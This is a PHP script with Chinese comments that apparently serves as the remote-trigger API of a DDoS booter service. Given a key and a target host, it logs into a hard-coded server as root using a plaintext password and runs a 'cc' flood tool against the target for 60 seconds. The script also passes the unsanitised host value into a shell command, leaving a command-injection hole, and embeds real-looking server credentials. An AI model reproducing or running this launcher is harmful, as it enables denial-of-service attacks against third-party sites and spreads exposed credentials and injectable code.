<?php
//攻击格式为： http://ip/?key=[密钥]&host=[IP地址]&port=[端口]&time=[时间]&method=[模式]
//攻击格式为： http://ip/?key=[密钥]&host=[host]
ignore_user_abort(true);
set_time_limit(1000);
$server_ip1 = "23.145.48.221"; //村少博客www.cunshao.com提示linux的服务器IP地址
$server_user = "root"; //账号  
$server_pass1 = "3JAvvmZF"; //密码  
$key = $_GET['key'];
$host = $_GET['host'];
$array = array("cc");  //支持的模式
$ray = array("xue"); //密钥
if (!empty($key)){
}else{
die('Error: 请勿留空!');}
if (in_array($key, $ray)){
}else{
die('Error: 错误的密钥!');}
if (!empty($host)){
}else{
die('Error: 攻击地址不能为空!');}
$command = "cd /root/ && ./cc $host 60";  //攻击脚本、反射文件目录，攻击命令//
//if ($ray == "xue") { $command = "node config.js $host 10000 $time&node cc.js $host 10000 $time"; } //攻击脚本、反射文件目录，攻击命令//
if (!function_exists("ssh2_connect")) die("Error: 你的服务器没有开启ssh2");
if(!($con = ssh2_connect($server_ip1, 22))){
  echo "Error: 连接失败";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass1)) {
  echo "Error: 登录失败请检查你的信息";
    } else {
  
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: 你的服务器没有能力去执行你的命令，或者你的攻击脚本不存在";
        } else {    
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
      echo "攻击成功!!";
            fclose($stream);
        }
    }
}
?>